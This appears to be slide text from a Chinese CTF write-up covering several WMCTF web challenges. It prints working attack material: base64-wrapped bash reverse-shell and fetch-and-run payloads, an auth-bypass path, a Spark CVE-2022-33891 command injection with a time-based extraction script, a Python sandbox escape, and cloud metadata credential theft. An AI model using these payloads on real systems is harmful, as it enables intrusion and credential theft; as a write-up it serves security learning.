第⼀步
读取配置⽂件 获取token 
RCE 链 
RCE! 
std.popen("bash -c 'echo 5YGH6KOF6L+Z5piv5LiA5p2h5Y+N5by5c2hlbGzor63lj6UgIG
lAcmNlLm1vZQ==|base64 -d|bash'", "r");
1
JavaScript
复制代码
12
第⼆步
缓存远程⽂件
/convert?url=http://1.1.1.1:8000/1.js 
第三步
计算缓存⽂件名 带⼊token 触发订阅转换 执⾏脚本 
/sub?
token=K5unAFg0wPO1j&target=clash&url=script:cache/c290fb8309721db5f8622eb278635c
1a 
GETSHELL! 
13
当时我的⼀个⽤于出⽹检测的vps 由于⽹络被动,在第⼀次发起请求时并没有返回数据. 
还以为⽬标服务器不出⽹. 
为了解决不出⽹的问题. 
当时就想到了利⽤嵌套convert构造⼀个url. 在不出⽹的情况下缓存⽂件. 
127.0.0.1:25500/convert?url=http://127.0.0.1:25500/convert?
url=data://text/plain,abcdefg123123orange 
结果发现了⼀个⽞学的现象
⾃身发起的请求总是⽆法请求到⾃身的http服务 
请求本地其他web服务正常访问 
⼩插曲
14
排查了半天后在数据包发现请求中有⼀个特殊的请求头
为了防⽌回环请求(⾃身访问⾃身服务)引起的dos 
在http头打了⼀个标记,收到有标记的请求直接拒绝访问. 
研究了半天发现⽆法绕过这个特性
本来要放弃的时候我⼜随⼿⼀测 发现⼜能访问我的VPS了 x) 
⼀个开源java 项⽬ 
https://github.com/zhangdaiscott/jeecg 
题⽬描述写的签到题难度 (checkin) 
实际上这道题也⾮常简单
题⽬修改了默认管理员密码
easyjeecg 
排查了半天才找出的安全特性
15
⾸先看下鉴权过滤器部分
其中有⼀处特别显眼的路由判断
判断了requestpath前⼏位是否为 api/ 作为鉴权⽩名单 
可以直接使⽤ api/;../ 绕过这个全局鉴权 
16
之后找到了⼀处后台上传点
题⽬禁⽌了访问upload⽬录下的jsp  jspx绕过之 
⼀道简单的内⽹渗透题
Java 
ssrf 
17
⽹站只有⼀个获取url访问的功能 
扫描内⽹同⽹段的机器
发现了⼀个低版本spark 
直接尝试 CVE-2022-33891 
发现过滤了空格和`  
spark 
18
多次测试发现⽬标机器完全不出⽹
尝试使⽤延时获取flag 
按照之前题⽬的套路 ,web题⽬的flag都是运⾏/readflag 读取 
先判断/readflag 是否存在 
编写bash脚本 
构造url 
url=http://10.244.0.145:8080/?
doAs=|echo${IFS}ZmlsZT0iL3JlYWRmbGFnIgppZiBbIC1mICIkZmlsZSIgXTsgdGhlbgogIHNsZWVwID
MKZmk%3D|base64${IFS}-d${IFS}|bash&Vcode=FPML 
根据延迟判断根⽬录下存在 readflag 
编写bash脚本判断⽂件内容 
奇怪的事情发⽣了 远程的机器测试⽆法复现 在执⾏第⼀⾏后就会⽴⻢退出 
尝试把执⾏后的结果写到临时⽂件 读取临时⽂件 
/readflag >/tmp/dfsdef 
再次尝试读取第⼀字节 脚本测试通过 
bash延时"注⼊" 
file="/readflag"
if [ -f "$file" ]; then
  sleep 3
fi
1
2
3
4
JavaScript
复制代码
VAR=`/readflag`;
if [[ "${VAR:0:1}" = "a" ]]; then
    sleep 2
else
    sleep 0
fi
1
2
3
4
5
6
JavaScript
复制代码
19
之后随⼿写了个简单的python2脚本⽤于⾃动化判断 
import requests
import base64
import urllib
small = [chr(i) for i in range(97,123)]
big = [chr(i) for i in range(65,91)]
num =[str(x) for x in range(0, 10)]
lista=small+big+num+['{','}',' ',"\n",'-','_']
data1="""VAR=`cat /tmp/dfsdef`;
if [[ "${{VAR:{}:1}}" = "{}" ]]; then
    sleep 2
else
    sleep 0
fi"""
print(lista)
b=0
while True:
    for a in lista:
        datab=data1.format(b,a)
        try:
            requests.post("http://1.13.254.132:8080/file",data="url=htt
p://10.244.0.145:8080/?doAs=|echo${IFS}"+urllib.quote(base64.b64encode(dat
ab.encode()))+"|base64${IFS}-d${IFS}|bash&Vcode=FPML", cookies={'JSESSIONI
D':'1F64EAF97095DA0736F5EE5B0F7CF20A'},headers={'Content-Type': 'applicati
on/x-www-form-urlencoded'}, timeout=1,verify=False)
        except:
            print(a)
            break
    b=b+1
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
Python
复制代码
20
readflag 返回了⼀个奇怪的内容 
看起来是某种交互shell 提示需要输⼊队伍token   因为没有输⼊返回了错误 
如果遇到这种普通的交互shell 有⼀个⾮常简单的解决⽅法
直接echo 后⾯加上换⾏符  使⽤管道重定向到⽬标的标准输⼊ 
重新读取返回
交互shell 
21
成功getflag 
这道题⾮常可惜 卡在了阿⾥云ak sts利⽤的部分 
题⽬使⽤了rust +rocket   
根⽬录中的Cargo.toml可以被下载 
6166lover 
信息泄露
22
得到了包名 static-file 
同时可以看出项⽬使⽤了 js-sandbox 和 cpython  
访问 /static-files  可以下载题⽬⽂件 
rust IDA反编译出的代码⾮常难看  
所以优先使⽤rocket⾃带的debuglog 判断路由 
阅读rocket代码 发现 loglevel 可以使⽤环境变量控制 
代码审计
[package]
name = "static-files"
version = "0.0.0"
workspace = "../"
edition = "2021"
publish = false
[dependencies]
rocket = "0.5.0-rc.2"
js-sandbox = "0.1.6"
cpython = "0.7.0"
1
2
3
4
5
6
7
8
9
10
11
Python
复制代码
23
添加环境变量运⾏ 发现有4条路由 
24
  (first) GET / 
(second) GET / 
  (test2) GET /debug/wnihwi2h2i2j1no1_path_wj2mm? 
  (test) GET /debug/3wj2io2j2nlwnmkwwkowjwojw_path_eee? 
结合IDA反编译 不难看出 两个test路由 
⼀个调⽤了js沙箱  
⼀个调⽤了cython 
显然cpython rce可能性更⼤些 
项⽬中没有导⼊其他python库 
也不能直接使⽤import 
访问
/debug/wnihwi2h2i2j1no1_path_wj2mm?code=print(dir(__builtins__))  
查看可以使⽤的函数
cpython简单的沙箱逃逸 
25
发现可以使⽤exec和__import__ 
/debug/wnihwi2h2i2j1no1_path_wj2mm?
code=print(exec(%22__import__(%27os%27).system(%27echo%20YmFzXXXXXXXXXXXXXXXXXPi
Yx%7Cbase64%20%2Dd%7Cbash%27)%22))  
直接尝试反弹shell 
成功rce
过了⼀段时间被kill  使⽤ nohup & fork ⼀个新进程 解决 
之后exit结束当前进程 
26
找了半天哪⾥都找不到flag) 
最后ps 发现启动时rm了flag 
⾸先我想到了rm删除的⽂件没有覆盖时可以从硬盘中直接读取 
这⾥只需要简单使⽤grep匹配字符串就可以 
构造命令⾏
本地测试成功
到了远程测试发现失败
明明df 中存在的⽬录 为什么会⽆法访问) 
数据恢复? 
dd if=/dev/sda1|grep -o -m 1 -a -E '(WMCTF)\{.*\}'
1
Python
复制代码
27
之前光在本地测试 之后才反应过来这原来是个容器环境) 
那么恢复⽂件的⽅法只可能是拿到容器镜像了
⽤于没有k8s逃逸经验 这⾥我直接拿出了CDK ⼯具⾃动检测 
发现可以访问到阿⾥云的metadata api 
k8s 容器逃逸 
ls -ll /dev/
total 0
lrwxrwxrwx 1 root root   11 Aug 21 11:39 core -> /proc/kcore
lrwxrwxrwx 1 root root   13 Aug 21 11:39 fd -> /proc/self/fd
crw-rw-rw- 1 root root 1, 7 Aug 21 11:39 full
drwxrwxrwt 2 root root   40 Aug 19 18:39 mqueue
crw-rw-rw- 1 root root 1, 3 Aug 21 11:39 null
lrwxrwxrwx 1 root root    8 Aug 21 11:39 ptmx -> pts/ptmx
drwxr-xr-x 2 root root    0 Aug 21 11:39 pts
crw-rw-rw- 1 root root 1, 8 Aug 21 11:39 random
drwxrwxrwt 2 root root   40 Aug 19 18:39 shm
lrwxrwxrwx 1 root root   15 Aug 21 11:39 stderr -> /proc/self/fd/2
lrwxrwxrwx 1 root root   15 Aug 21 11:39 stdin -> /proc/self/fd/0
lrwxrwxrwx 1 root root   15 Aug 21 11:39 stdout -> /proc/self/fd/1
-rw-rw-rw- 1 root root    0 Aug 21 11:39 termination-log
crw-rw-rw- 1 root root 5, 0 Aug 21 11:39 tty
crw-rw-rw- 1 root root 1, 9 Aug 21 11:39 urandom
crw-rw-rw- 1 root root 1, 5 Aug 21 11:39 zero
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
空空如也的/dev/
Python
复制代码
28
拿到了⼀个 ⻆⾊为KubernetesWorkerRole的StS 临时令牌 
经过⼀下午的测试 发现这个令牌的权限⾮常⼩ 这是个阿⾥云容器服务 ACK容器内的key  
得到的稍微有价值的信息  只有通过api读取的ecs实例列表 
并不能进⾏修改操作 猜测应该要拉取题⽬镜像 getflag 但是在题⽬给出的阿⾥云国际版⽂档并没有找到
api
只进⾏到这⾥了 x) 
---------------------- 
在官⽅解放出来后成功复现了题⽬
29
使⽤拿到的token调⽤GetAuthorizationToken api 获取阿⾥云镜像仓库的临时凭证 
https://help.aliyun.com/document_detail/72334.html 
WEB-6166lover:
1. Figure out that is a Rocket application and has Cargo.tml leaked.
2. Download it and find the application name "static-files" and download t
he binary.
3. Run it with debug mode or Write a example application by yourself to fi
nd out the route has been registered.
4. Figure out both of the debug route have done, one is js sandbox, the an
other one is python "sandbox". Just think them as a black box and test the
m.
5. Run python code to RCE.
6. ps -ef, You will find /flag has been deleted when the instance booted.
7. Use Alibabacloud metadata to get the host instance metadata, And a work
er role on it. https://help.aliyun.com/document_detail/214777.html / /meta
-data/ram/security-credentials/
8. Use metadata api to get the temp credentials. 
9. Use temp credentials to invoke api GetAuthorizationToken. https://help.